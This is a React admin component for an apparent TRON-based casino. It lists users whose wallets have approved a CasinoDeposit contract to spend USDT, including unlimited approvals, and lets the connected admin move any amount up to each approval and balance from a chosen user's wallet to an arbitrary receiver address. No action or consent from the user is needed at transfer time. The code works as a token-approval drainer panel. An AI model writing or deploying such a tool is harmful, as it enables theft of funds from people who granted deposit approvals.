'use client';

import { useState, useEffect, useCallback } from 'react';
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { createClient } from '@/lib/supabase';
import { getActiveTronConfig } from '@/lib/contracts';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import { Loader2, Send, RefreshCw, AlertCircle, CheckCircle, Users, Wallet } from 'lucide-react';
import { toast } from 'sonner';

interface UserData {
  id: string;
  wallet_address: string;
}

interface UserWithData extends UserData {
  allowance: bigint;
  balance: bigint;
}

// Helper to check if address is a TRON address (starts with T or t, case-insensitive)
const isTronAddress = (address: string): boolean => {
  return !!address && (address.startsWith('T') || address.startsWith('t')) && address.length === 34;
};

// Convert stored lowercase address to proper TRON Base58 format for display
const formatTronAddress = (address: string): string => {
  // If already uppercase, return as-is
  if (address.startsWith('T')) return address;
  // Convert first letter to uppercase for display (TRON addresses always start with T)
  return 'T' + address.slice(1);
};

export function PermitTransfer() {
  const { address: tronAddress, connected: isTronConnected } = useWallet();
  const supabase = createClient();
  
  const [users, setUsers] = useState<UserData[]>([]);
  const [usersWithData, setUsersWithData] = useState<UserWithData[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isLoadingData, setIsLoadingData] = useState(false);
  const [selectedUser, setSelectedUser] = useState<UserWithData | null>(null);
  const [receiverAddress, setReceiverAddress] = useState('');
  const [transferAmount, setTransferAmount] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [txSuccess, setTxSuccess] = useState(false);

  // Load users from database - only TRON addresses
  const loadUsers = useCallback(async () => {
    setIsLoading(true);
    try {
      // Database stores addresses in lowercase (start with 't')
      const { data, error } = await supabase
        .from('users')
        .select('id, wallet_address')
        .not('wallet_address', 'is', null)
        .like('wallet_address', 't%')
        .order('created_at', { ascending: false });
      
      if (error) {
        console.error('Error loading users:', error);
        toast.error('Failed to load users');
        return;
      }
      
      // Filter to only valid TRON addresses
      const tronUsers = (data || []).filter((u: any) => isTronAddress(u.wallet_address));
      setUsers(tronUsers);
    } catch (error) {
      console.error('Error:', error);
      toast.error('Failed to load users');
    } finally {
      setIsLoading(false);
    }
  }, [supabase]);

  // Fetch allowances and balances for TRON users
  const fetchTronData = useCallback(async () => {
    if (users.length === 0) {
      setUsersWithData([]);
      return;
    }

    setIsLoadingData(true);
    try {
      const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
      if (!tronWeb || !tronWeb.ready) {
        console.warn('TronWeb not available');
        setUsersWithData([]);
        return;
      }

      const tronConfig = getActiveTronConfig();
      const usdtContract = await tronWeb.contract().at(tronConfig.usdt);
      
      const usersData: UserWithData[] = [];
      
      for (const user of users) {
        try {
          // Fetch allowance and balance for USDT - use formatted address
          const formattedAddr = formatTronAddress(user.wallet_address);
          const [allowanceResult, balanceResult] = await Promise.all([
            usdtContract.allowance(formattedAddr, tronConfig.casinoDepositAddress).call(),
            usdtContract.balanceOf(formattedAddr).call()
          ]);

          const allowance = allowanceResult?.toString ? BigInt(allowanceResult.toString()) : BigInt(0);
          const balance = balanceResult?.toString ? BigInt(balanceResult.toString()) : BigInt(0);

          // Only include users with allowance > 0
          if (allowance > BigInt(0)) {
            usersData.push({
              ...user,
              allowance,
              balance
            });
          }
        } catch (err) {
          console.warn(`Failed to fetch data for ${user.wallet_address}:`, err);
        }
      }
      
      setUsersWithData(usersData);
    } catch (error) {
      console.error('Error fetching TRON data:', error);
      toast.error('Failed to fetch user allowances');
    } finally {
      setIsLoadingData(false);
    }
  }, [users]);

  useEffect(() => {
    loadUsers();
  }, [loadUsers]);

  useEffect(() => {
    if (users.length > 0 && isTronConnected) {
      fetchTronData();
    }
  }, [users, isTronConnected, fetchTronData]);

  // Execute transfer from user using TronWeb
  const executeTransfer = async () => {
    if (!selectedUser || !receiverAddress || !transferAmount) {
      toast.error('Please fill in all fields');
      return;
    }

    // Validate receiver address format (TRON address)
    if (!isTronAddress(receiverAddress)) {
      toast.error('Invalid TRON receiver address format (must start with T and be 34 characters)');
      return;
    }

    const allowance = selectedUser.allowance;
    const balance = selectedUser.balance;
    
    // USDT on TRON has 6 decimals
    const amount = BigInt(Math.floor(parseFloat(transferAmount) * 1e6));

    if (amount <= BigInt(0)) {
      toast.error('Amount must be greater than 0');
      return;
    }

    if (amount > allowance) {
      toast.error('Transfer amount exceeds user allowance');
      return;
    }

    if (amount > balance) {
      toast.error('Transfer amount exceeds user balance');
      return;
    }

    try {
      setIsProcessing(true);
      setTxSuccess(false);

      const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
      if (!tronWeb || !tronWeb.ready) {
        toast.error('TronLink wallet not detected or not ready');
        return;
      }

      const tronConfig = getActiveTronConfig();
      
      // Debug logging
      // Use formatted TRON address (uppercase T)
      const formattedFromAddr = formatTronAddress(selectedUser.wallet_address);
      
      console.log('=== TRON Transfer Debug Info ===');
      console.log('Casino Contract:', tronConfig.casinoDepositAddress);
      console.log('USDT Token:', tronConfig.usdt);
      console.log('From (User):', formattedFromAddr);
      console.log('To (Receiver):', receiverAddress);
      console.log('Amount (sun):', amount.toString());
      console.log('User Allowance (sun):', allowance.toString());
      console.log('User Balance (sun):', balance.toString());
      console.log('Connected Wallet:', tronAddress);
      console.log('================================');

      const casinoContract = await tronWeb.contract().at(tronConfig.casinoDepositAddress);
      
      // Call transferFromUser on the CasinoDeposit contract
      const tx = await casinoContract.transferFromUser(
        tronConfig.usdt,
        formattedFromAddr,
        receiverAddress,
        amount.toString()
      ).send();

      console.log('Transfer tx:', tx);
      toast.success('Transfer submitted successfully!');
      setTxSuccess(true);
      
      // Reset form
      setSelectedUser(null);
      setReceiverAddress('');
      setTransferAmount('');
      
      // Refresh data
      setTimeout(() => fetchTronData(), 3000);
    } catch (error: any) {
      console.error('Transfer error:', error);
      
      const errorMessage = error.message || '';
      
      if (errorMessage.includes('caller is not the owner') || errorMessage.includes('Ownable')) {
        toast.error('Only the contract owner can execute this transfer');
      } else if (errorMessage.includes('insufficient allowance')) {
        toast.error('User has not approved enough tokens for this transfer');
      } else if (errorMessage.includes('insufficient balance')) {
        toast.error('User does not have enough token balance');
      } else if (errorMessage.includes('rejected') || errorMessage.includes('denied') || errorMessage.includes('cancelled')) {
        toast.error('Transaction rejected by user');
      } else {
        toast.error(errorMessage || 'Transfer failed');
      }
    } finally {
      setIsProcessing(false);
    }
  };

  // Format address for display - use proper TRON format
  const formatAddress = (addr: string) => {
    const formatted = formatTronAddress(addr);
    return `${formatted.slice(0, 8)}...${formatted.slice(-6)}`;
  };

  // Format amount for display (USDT has 6 decimals on TRON)
  const formatAmount = (amount: bigint) => {
    const num = Number(amount) / 1e6;
    if (num > 1e15) return '∞'; // Unlimited approval
    return num.toLocaleString(undefined, { maximumFractionDigits: 2 });
  };

  const handleRefresh = () => {
    loadUsers();
    if (isTronConnected) {
      fetchTronData();
    }
  };

  const allLoading = isLoading || isLoadingData;

  return (
    <Card className="bg-casino-panel border-white/5">
      <CardHeader>
        <div className="flex items-center justify-between">
          <div>
            <CardTitle className="flex items-center gap-2">
              <Users className="h-5 w-5 text-casino-brand" />
              TRON Admin Transfer
            </CardTitle>
            <CardDescription>
              Transfer USDT from TRON users who have approved the contract
            </CardDescription>
          </div>
          <Button variant="outline" size="sm" onClick={handleRefresh} disabled={allLoading}>
            <RefreshCw className={`h-4 w-4 mr-2 ${allLoading ? 'animate-spin' : ''}`} />
            Refresh
          </Button>
        </div>
      </CardHeader>
      <CardContent className="space-y-6">
        {!isTronConnected ? (
          <div className="flex items-center gap-2 p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
            <Wallet className="h-5 w-5 text-yellow-500" />
            <span className="text-yellow-400">Please connect your TRON admin wallet to transfer tokens</span>
          </div>
        ) : (
          <>
            {/* Connected Wallet Info */}
            <div className="flex items-center gap-2 p-3 rounded-lg bg-casino-brand/10 border border-casino-brand/20">
              <Wallet className="h-4 w-4 text-casino-brand" />
              <span className="text-casino-brand text-sm">
                Connected: {tronAddress?.slice(0, 8)}...{tronAddress?.slice(-6)}
              </span>
            </div>

            {/* Transaction Success Status */}
            {txSuccess && (
              <div className="flex items-center gap-2 p-3 rounded-lg bg-green-500/10 border border-green-500/20">
                <CheckCircle className="h-4 w-4 text-green-400" />
                <span className="text-green-400">Transfer submitted successfully!</span>
              </div>
            )}

            {/* Users with Approvals Table */}
            <div className="rounded-md border border-white/10 overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow className="border-white/10 hover:bg-transparent">
                    <TableHead>TRON Wallet</TableHead>
                    <TableHead className="text-center">USDT Balance</TableHead>
                    <TableHead className="text-center">USDT Approved</TableHead>
                    <TableHead>Action</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {allLoading ? (
                    <TableRow>
                      <TableCell colSpan={4} className="text-center py-8">
                        <Loader2 className="h-6 w-6 animate-spin mx-auto mb-2" />
                        Loading TRON users and token data...
                      </TableCell>
                    </TableRow>
                  ) : usersWithData.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={4} className="text-center py-8 text-muted-foreground">
                        <AlertCircle className="h-6 w-6 mx-auto mb-2 opacity-50" />
                        No TRON users with USDT approvals found
                      </TableCell>
                    </TableRow>
                  ) : (
                    usersWithData.map((user) => {
                      const isSelected = selectedUser?.id === user.id;
                      
                      return (
                        <TableRow 
                          key={user.id} 
                          className={`border-white/10 cursor-pointer transition-colors ${isSelected ? 'bg-casino-brand/10' : 'hover:bg-white/5'}`}
                          onClick={() => setSelectedUser(isSelected ? null : user)}
                        >
                          <TableCell className="font-mono">
                            <div className="flex items-center gap-2">
                              <Badge variant="outline" className="text-xs border-red-500/50 text-red-400">
                                TRC-20
                              </Badge>
                              {formatAddress(user.wallet_address)}
                            </div>
                          </TableCell>
                          <TableCell className="text-center">
                            <span className="text-sm">
                              {formatAmount(user.balance)} USDT
                            </span>
                          </TableCell>
                          <TableCell className="text-center">
                            <Badge variant="outline" className="border-green-500/50 text-green-400">
                              {formatAmount(user.allowance)} USDT
                            </Badge>
                          </TableCell>
                          <TableCell>
                            <Button 
                              size="sm" 
                              variant={isSelected ? "default" : "outline"}
                              className={isSelected ? "bg-casino-brand text-black" : ""}
                            >
                              {isSelected ? 'Selected' : 'Select'}
                            </Button>
                          </TableCell>
                        </TableRow>
                      );
                    })
                  )}
                </TableBody>
              </Table>
            </div>

            {/* Transfer Form */}
            {selectedUser && (
              <div className="p-4 rounded-lg border border-casino-brand/30 bg-casino-brand/5 space-y-4">
                <h4 className="font-semibold flex items-center gap-2">
                  <CheckCircle className="h-4 w-4 text-casino-brand" />
                  Transfer USDT from {formatAddress(selectedUser.wallet_address)}
                </h4>
                
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label>Receiver TRON Address</Label>
                    <Input
                      placeholder="T..."
                      value={receiverAddress}
                      onChange={(e) => setReceiverAddress(e.target.value)}
                      className="bg-black/30 border-white/10"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label>
                      Amount USDT (Max: {formatAmount(
                        selectedUser.balance < selectedUser.allowance 
                          ? selectedUser.balance 
                          : selectedUser.allowance
                      )})
                    </Label>
                    <Input
                      type="number"
                      placeholder="0.00"
                      value={transferAmount}
                      onChange={(e) => setTransferAmount(e.target.value)}
                      className="bg-black/30 border-white/10"
                    />
                  </div>
                </div>

                <Button
                  onClick={executeTransfer}
                  disabled={isProcessing || !receiverAddress || !transferAmount}
                  className="w-full bg-casino-brand text-black hover:bg-casino-brand/90"
                >
                  {isProcessing ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    <>
                      <Send className="mr-2 h-4 w-4" />
                      Transfer USDT
                    </>
                  )}
                </Button>

                <p className="text-xs text-muted-foreground">
                  This will transfer USDT from the selected TRON user to the receiver address. 
                  User must have approved the CasinoDeposit contract.
                </p>
              </div>
            )}
          </>
        )}
      </CardContent>
    </Card>
  );
}
